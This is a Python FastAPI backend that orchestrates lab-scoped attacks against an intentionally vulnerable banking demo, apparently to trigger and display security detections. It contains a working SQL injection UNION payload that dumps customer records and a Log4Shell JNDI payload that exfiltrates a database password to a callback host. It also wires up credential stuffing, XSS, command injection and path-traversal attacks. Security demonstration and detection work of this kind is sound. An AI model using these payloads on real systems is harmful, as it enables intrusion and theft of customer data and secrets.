"""
EvilDog API — Attack Orchestrator backend (DogBank LAB ONLY)
============================================================
Wraps the existing `SecurityAttacker` engine (load-generator/security_attacker.py,
vendored) behind REST + SSE so the in-app EvilDog tab can:

  · fire REAL, lab-scoped attacks (the malicious User-Agent flags in Datadog AAP),
  · read structured impact (SQLi records_leaked/leaked_data, Log4Shell exfil secret),
  · stream live telemetry (attacker logs -> SSE) for the terminal + pipeline nodes,
  · surface stats for the dashboard cards.

Safe scoping: targets come from EXTERNAL_TARGET / *_SERVICE_URL / PUBLIC_BASE_URL,
which point only at the lab services. There is no arbitrary-target input.
"""

import os

# Target scoping MUST be decided before importing the attack engine (it reads
# env at import time). Default to internal lab service names.
os.environ.setdefault("EXTERNAL_TARGET", "false")

import asyncio
import json
import logging
import re
import time
import uuid
from contextlib import asynccontextmanager
from datetime import datetime, timezone
from typing import Dict, List, Optional, Set

from fastapi import FastAPI, Body
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, StreamingResponse
from pydantic import BaseModel

# Datadog APM (auto-injected in k8s; explicit patch for compose parity)
try:
    from ddtrace import patch_all
    patch_all()
except Exception:  # ddtrace optional for local dev
    pass

import requests

# Vendored attack engine
from security_attacker import (  # noqa: E402
    SecurityAttacker,
    AUTH_SERVICE_URL,
    TRANSACTION_SERVICE_URL,
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("evildog-api")

# --------------------------------------------------------------------------- #
# Configuration                                                               #
# --------------------------------------------------------------------------- #
PUBLIC_BASE_URL = os.getenv("PUBLIC_BASE_URL", "https://lab.dogbank.dog")
TARGET_LABEL = os.getenv("EVILDOG_TARGET_LABEL", "lab.dogbank.dog")
LOG4J_CALLBACK_HOST = os.getenv("LOG4J_CALLBACK_HOST", "evildog-callback")
LOG4J_CALLBACK_LDAP_PORT = os.getenv("LOG4J_CALLBACK_LDAP_PORT", "1389")
LOG4J_CALLBACK_HTTP_PORT = os.getenv("LOG4J_CALLBACK_HTTP_PORT", "8000")
LOG4J_EXFIL_ENV = os.getenv("LOG4J_EXFIL_ENV", "SPRING_DATASOURCE_PASSWORD")
LOG4SHELL_ENDPOINT = os.getenv("LOG4SHELL_ENDPOINT", "/api/auth/lab/log4shell")

# The star SQLi: UNION exfil against the intentionally-vulnerable validate-pix-key.
# Column types must match the vulnerable outer query
# (u.nome,u.email,u.cpf,c.saldo,c.banco,u.chave_pix) — c.saldo is NUMERIC, so do
# NOT cast it to text or the UNION errors (HTTP 500) instead of leaking rows.
SQLI_EXFIL_PAYLOAD = (
    "' UNION SELECT u.nome,u.email,u.cpf,c.saldo,c.banco,u.chave_pix "
    "FROM usuarios u JOIN contas c ON u.id=c.usuario_id--"
)

# Attack vectors surfaced to the UI (sidebar + orchestrator).
VECTORS = [
    {"id": "sqli", "label": "SQL Injection", "cwe": "CWE-89", "severity": "critical", "node": "INJECT"},
    {"id": "log4shell", "label": "Log4Shell (JNDI)", "cwe": "CVE-2021-44228", "severity": "critical", "node": "INJECT"},
    {"id": "credential-stuffing", "label": "Credential Stuffing", "cwe": "OWASP A07", "severity": "high", "node": "BYPASS"},
    {"id": "xss", "label": "XSS", "cwe": "CWE-79", "severity": "medium", "node": "INJECT"},
    {"id": "idor", "label": "IDOR", "cwe": "CWE-639", "severity": "high", "node": "EXTRACT"},
    {"id": "rce", "label": "Command Injection", "cwe": "CWE-77", "severity": "critical", "node": "INJECT"},
    {"id": "path-traversal", "label": "Path Traversal", "cwe": "CWE-22", "severity": "high", "node": "EXTRACT"},
    {"id": "auth-bypass", "label": "Auth Bypass", "cwe": "CWE-287", "severity": "high", "node": "BYPASS"},
]
VECTOR_IDS = {v["id"] for v in VECTORS}

# --------------------------------------------------------------------------- #
# Telemetry bus: thread-safe fan-out of events to SSE subscribers             #
# --------------------------------------------------------------------------- #
def _now() -> str:
    return datetime.now(timezone.utc).strftime("%H:%M:%S")


class TelemetryBus:
    def __init__(self, ring: int = 300):
        self.subscribers: Set[asyncio.Queue] = set()
        self.recent: List[dict] = []
        self.ring = ring
        self.loop: Optional[asyncio.AbstractEventLoop] = None

    def bind_loop(self, loop: asyncio.AbstractEventLoop) -> None:
        self.loop = loop

    def publish(self, event: dict) -> None:
        """Safe to call from any thread."""
        event.setdefault("ts", _now())
        event.setdefault("type", "log")
        if self.loop is not None:
            self.loop.call_soon_threadsafe(self._fanout, event)
        else:  # no loop yet (import-time) — just buffer
            self._store(event)

    def _store(self, event: dict) -> None:
        self.recent.append(event)
        if len(self.recent) > self.ring:
            self.recent = self.recent[-self.ring:]

    def _fanout(self, event: dict) -> None:
        self._store(event)
        for q in list(self.subscribers):
            try:
                q.put_nowait(event)
            except asyncio.QueueFull:
                pass

    def subscribe(self) -> asyncio.Queue:
        q: asyncio.Queue = asyncio.Queue(maxsize=1000)
        self.subscribers.add(q)
        return q

    def unsubscribe(self, q: asyncio.Queue) -> None:
        self.subscribers.discard(q)


bus = TelemetryBus()

# Map the attacker's log tags to orchestrator nodes.
_TAG_NODE = {
    "SQL-INJECTION": "INJECT",
    "LOG4SHELL": "INJECT",
    "RCE": "INJECT",
    "XSS": "INJECT",
    "CREDENTIAL-STUFFING": "BYPASS",
    "AUTH-BYPASS": "BYPASS",
    "IDOR": "EXTRACT",
    "PATH-TRAVERSAL": "EXTRACT",
    "POST-EXPLOIT": "EXTRACT",
}
_TAG_RE = re.compile(r"\[([A-Z0-9\-]+)\]")


def _classify(message: str, levelno: int) -> tuple:
    upper = message.upper()
    if any(k in upper for k in ("SUCESSO", "VULNERAV", "VALIDAS", "DESCOBERTAS", "LEAKED", "EXFIL")):
        level = "success"
    elif "BLOQUEADO" in upper or "403" in upper:
        level = "warn"
    elif levelno >= logging.ERROR:
        level = "critical"
    elif levelno >= logging.WARNING:
        level = "warn"
    else:
        level = "info"
    m = _TAG_RE.search(message)
    node = _TAG_NODE.get(m.group(1)) if m else None
    return level, node


class SSELogHandler(logging.Handler):
    """Bridges the attacker's Python logging into the telemetry bus."""

    def emit(self, record: logging.LogRecord) -> None:
        try:
            msg = record.getMessage().strip()
            if not msg:
                return
            level, node = _classify(msg, record.levelno)
            bus.publish({
                "type": "log",
                "level": level,
                "node": node,
                "message": msg,
            })
        except Exception:  # never let telemetry break attacks
            pass


# --------------------------------------------------------------------------- #
# Attacker + API state (single operator session for v1)                       #
# --------------------------------------------------------------------------- #
attacker = SecurityAttacker()

API_STATE = {
    "findings": 0,                 # -> vulnerabilities_found
    "compromised": set(),          # -> systems_compromised (service names)
    "records_leaked_total": 0,
    "secrets": [],                 # leaked secrets (log4shell)
    "last_pipeline": {},           # node -> state
}
_attack_lock = asyncio.Lock()      # serialize use of the shared requests.Session


def _cards() -> dict:
    s = attacker.stats
    return {
        "vulnerabilities_found": API_STATE["findings"] + s.get("detected", 0),
        "exploits_executed": s.get("total_attacks", 0),
        "systems_compromised": len(API_STATE["compromised"]),
        "active_sessions": max(1, len(bus.subscribers)),
    }


# --------------------------------------------------------------------------- #
# Structured impact wrappers (real calls, parsed results)                     #
# --------------------------------------------------------------------------- #
def _run_sqli_exfil() -> dict:
    """Real UNION exfil against validate-pix-key; returns records_leaked + preview."""
    url = f"{TRANSACTION_SERVICE_URL}/api/transactions/validate-pix-key"
    try:
        r = requests.get(
            url,
            params={"pixKey": SQLI_EXFIL_PAYLOAD},
            headers=dict(attacker.session.headers),
            timeout=15,
        )
        data = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
    except Exception as exc:
        bus.publish({"level": "critical", "node": "INJECT", "message": f"[SQL-INJECTION] erro: {exc}"})
        return {"ok": False, "error": str(exc)}

    records = data.get("records_leaked") or (len(data.get("leaked_data", [])) if data.get("leaked_data") else 0)
    leaked = data.get("leaked_data", [])[:8]
    if records:
        API_STATE["records_leaked_total"] += records
        API_STATE["findings"] += 1
        API_STATE["compromised"].add("transaction-service")
        bus.publish({"level": "success", "node": "EXTRACT",
                     "message": f"[EXTRACT] SQLi vazou {records} registros de clientes (CPF/saldo/chave PIX)"})
    return {
        "ok": True, "http_status": r.status_code, "records_leaked": records,
        "leaked_preview": leaked, "query": data.get("query_executed"),
    }


def _scrape_callback_secret() -> Optional[str]:
    for host in (f"{LOG4J_CALLBACK_HOST}:{LOG4J_CALLBACK_HTTP_PORT}", "localhost:1390"):
        try:
            r = requests.get(f"http://{host}/", timeout=4)
            m = re.search(r"class='s'>([^<]+)", r.text)
            if m:
                return m.group(1).strip()
        except Exception:
            continue
    return None


def _run_log4shell_exfil() -> dict:
    """Fire a JNDI exfil payload at the lab endpoint, then read the leaked secret."""
    payload = ("${jndi:ldap://" + LOG4J_CALLBACK_HOST + ":" + LOG4J_CALLBACK_LDAP_PORT
               + "/cn=${env:" + LOG4J_EXFIL_ENV + "}}")
    run_id = f"evildog-ui-{uuid.uuid4().hex[:8]}"
    bus.publish({"level": "info", "node": "PAYLOAD", "message": f"[LOG4SHELL] payload: {payload}"})
    try:
        requests.post(
            f"{AUTH_SERVICE_URL}{LOG4SHELL_ENDPOINT}",
            headers={
                "User-Agent": payload,
                "X-Api-Version": payload,
                "X-EvilDog-Run": run_id,
                "Content-Type": "application/json",
                "X-Attack-Simulation": "DogBank-Demo",
            },
            json={"runId": run_id, "payload": "log4shell"},
            timeout=10,
        )
    except Exception as exc:
        bus.publish({"level": "critical", "node": "INJECT", "message": f"[LOG4SHELL] erro: {exc}"})
        return {"ok": False, "error": str(exc)}

    time.sleep(2.0)  # give the JNDI callback a moment to land
    secret = _scrape_callback_secret()
    if secret:
        API_STATE["secrets"].append({LOG4J_EXFIL_ENV: secret})
        API_STATE["findings"] += 1
        API_STATE["compromised"].add("auth-service")
        bus.publish({"level": "success", "node": "EXTRACT",
                     "message": f"[EXTRACT] Log4Shell exfiltrou {LOG4J_EXFIL_ENV}={secret}"})
    else:
        bus.publish({"level": "warn", "node": "INJECT",
                     "message": "[LOG4SHELL] callback não confirmado (verifique evildog-callback)"})
    return {"ok": True, "payload": payload, "exfil_env": LOG4J_EXFIL_ENV, "secret": secret, "run_id": run_id}


# Map vector id -> the attacker method that generates the real malicious traffic.
_ATTACKER_METHODS = {
    "sqli": lambda: attacker.attack_sql_injection(),
    "log4shell": lambda: attacker.attack_log4shell(),
    "credential-stuffing": lambda: attacker.attack_credential_stuffing(),
    "xss": lambda: attacker.attack_xss(),
    "idor": lambda: attacker.attack_idor(),
    "rce": lambda: attacker.attack_rce(),
    "path-traversal": lambda: attacker.attack_path_traversal(),
    "auth-bypass": lambda: attacker.attack_auth_bypass(),
}


def _run_vector(vector: str) -> dict:
    """Blocking: run one attack vector and return structured result."""
    attacker.stats["total_attacks"] += 1
    result: dict = {"vector": vector, "ok": True}

    # Structured impact for the two hero vectors.
    if vector == "sqli":
        result.update(_run_sqli_exfil())
    elif vector == "log4shell":
        result.update(_run_log4shell_exfil())

    # Always generate the recognizable malicious traffic (flags in Datadog AAP).
    method = _ATTACKER_METHODS.get(vector)
    if method:
        try:
            method()
        except Exception as exc:
            bus.publish({"level": "critical", "message": f"[{vector}] erro: {exc}"})
            result["ok"] = False
            result["error"] = str(exc)

    if vector == "credential-stuffing" and attacker.stats.get("stuffing_success", 0) > 0:
        API_STATE["findings"] += 1
        API_STATE["compromised"].add("auth-service")
    return result


# --------------------------------------------------------------------------- #
# Pipeline (Attack Orchestrator) — RECON..EXTRACT with node-state events      #
# --------------------------------------------------------------------------- #
PIPELINE_NODES = ["RECON", "SCAN", "DETECT", "PAYLOAD", "INJECT", "BYPASS", "EXTRACT", "REPORT"]


def _node(node: str, state: str, message: str = "") -> None:
    API_STATE["last_pipeline"][node] = state
    bus.publish({"type": "node", "node": node, "state": state,
                 "level": "success" if state == "success" else ("critical" if state == "fail" else "info"),
                 "message": message or f"{node}: {state}"})


def _run_pipeline(run_id: str) -> None:
    """Blocking pipeline run; emits node states + real attack traffic."""
    for n in PIPELINE_NODES:
        API_STATE["last_pipeline"][n] = "idle"
    try:
        _node("RECON", "active", "[RECON] descobrindo alvo…")
        try:
            requests.get(f"{AUTH_SERVICE_URL}/api/auth/health",
                         headers=dict(attacker.session.headers), timeout=6)
        except Exception:
            pass
        _node("RECON", "success", f"[RECON] alvo: {TARGET_LABEL}")

        _node("SCAN", "active", "[SCAN] varrendo serviços…")
        time.sleep(0.6)
        _node("SCAN", "success", "[SCAN] portas: 8088, 8084, 8089, 5432")

        _node("DETECT", "active", "[DETECT] procurando vulnerabilidades…")
        sqli = _run_sqli_exfil()
        vulnerable = bool(sqli.get("records_leaked"))
        _node("DETECT", "success" if vulnerable else "fail",
              "[DETECT] SQL Injection encontrada" if vulnerable else "[DETECT] alvo aparentemente seguro")

        if not vulnerable:
            _node("REPORT", "success", "[REPORT] nenhum exploit executado (SKIP)")
            bus.publish({"type": "pipeline", "state": "done", "run_id": run_id})
            return

        _node("PAYLOAD", "active", "[PAYLOAD] montando payload de injeção…")
        time.sleep(0.4)
        _node("PAYLOAD", "success", "[PAYLOAD] ' OR 1=1; UNION SELECT … --")

        _node("INJECT", "active", "[INJECT] executando SQL Injection…")
        attacker.stats["total_attacks"] += 1
        try:
            attacker.attack_sql_injection()
        except Exception:
            pass
        _node("INJECT", "success", "[INJECT] payload executado")

        _node("BYPASS", "active", "[BYPASS] tentando account takeover…")
        attacker.stats["total_attacks"] += 1
        try:
            attacker.attack_credential_stuffing()
        except Exception:
            pass
        _node("BYPASS", "success", "[BYPASS] acesso obtido")

        _node("EXTRACT", "active", "[EXTRACT] exfiltrando dados…")
        records = sqli.get("records_leaked", 0)
        _node("EXTRACT", "success", f"[EXTRACT] {records} registros exfiltrados")

        _node("REPORT", "success", "[REPORT] exploit concluído")
        bus.publish({"type": "pipeline", "state": "done", "run_id": run_id,
                     "level": "success", "message": "[REPORT] pipeline concluído"})
    except Exception as exc:
        bus.publish({"type": "pipeline", "state": "error", "run_id": run_id,
                     "level": "critical", "message": f"pipeline erro: {exc}"})


# --------------------------------------------------------------------------- #
# FastAPI app                                                                 #
# --------------------------------------------------------------------------- #
@asynccontextmanager
async def lifespan(app: FastAPI):
    bus.bind_loop(asyncio.get_running_loop())
    handler = SSELogHandler()
    handler.setLevel(logging.INFO)
    logging.getLogger("security_attacker").addHandler(handler)
    logger.info("🐕‍🦺 evildog-api up — attack orchestrator ready (lab only)")
    bus.publish({"level": "info", "message": "[SYSTEM] EvilDog online — alvo carregado"})
    yield


app = FastAPI(title="EvilDog API", description="DogBank attack orchestrator (lab only)",
              version="1.0.0", lifespan=lifespan)
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True,
    allow_methods=["*"], allow_headers=["*"],
)


class AttackRequest(BaseModel):
    payload: Optional[str] = None


@app.get("/api/evildog/health")
async def health():
    return {"status": "ok", "service": "evildog-api"}


@app.get("/api/evildog/vectors")
async def vectors():
    return {"vectors": VECTORS}


@app.get("/api/evildog/stats")
async def stats():
    return {"cards": _cards(), "raw": attacker.stats,
            "records_leaked_total": API_STATE["records_leaked_total"],
            "secrets": API_STATE["secrets"]}


@app.get("/api/evildog/target")
async def target():
    return {
        "address": TARGET_LABEL,
        "os": "Debian Linux (container) · EKS",
        "services": ["Spring Boot (auth/tx/account)", "PostgreSQL", "Nginx", "Chatbot (FastAPI)"],
        "open_ports": [
            {"port": 8088, "service": "auth"},
            {"port": 8084, "service": "transaction"},
            {"port": 8089, "service": "account"},
            {"port": 5432, "service": "postgres"},
            {"port": 443, "service": "https"},
        ],
        "cvss": 9.8,
        "severity": "CRITICAL",
    }


@app.post("/api/evildog/attack/{vector}")
async def attack(vector: str, body: AttackRequest = Body(default=AttackRequest())):
    if vector not in VECTOR_IDS:
        return JSONResponse(status_code=404, content={"error": f"unknown vector '{vector}'"})
    vmeta = next(v for v in VECTORS if v["id"] == vector)
    bus.publish({"level": "info", "node": vmeta["node"],
                 "message": f"[{vmeta['label'].upper()}] iniciando ({vmeta['cwe']})…"})
    async with _attack_lock:
        result = await asyncio.get_running_loop().run_in_executor(None, _run_vector, vector)
    result["cards"] = _cards()
    return result


@app.post("/api/evildog/pipeline/run")
async def pipeline_run():
    run_id = f"run-{uuid.uuid4().hex[:8]}"
    async def _bg():
        async with _attack_lock:
            await asyncio.get_running_loop().run_in_executor(None, _run_pipeline, run_id)
    asyncio.create_task(_bg())
    return {"run_id": run_id, "status": "started", "nodes": PIPELINE_NODES}


@app.get("/api/evildog/pipeline/state")
async def pipeline_state():
    return {"nodes": API_STATE["last_pipeline"]}


@app.get("/api/evildog/stream")
async def stream():
    async def event_gen():
        q = bus.subscribe()
        # Replay a little recent context so a fresh tab isn't empty.
        for ev in bus.recent[-25:]:
            yield f"data: {json.dumps(ev)}\n\n"
        try:
            while True:
                try:
                    ev = await asyncio.wait_for(q.get(), timeout=15)
                    yield f"data: {json.dumps(ev)}\n\n"
                except asyncio.TimeoutError:
                    yield ": keepalive\n\n"
        finally:
            bus.unsubscribe(q)

    return StreamingResponse(
        event_gen(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )
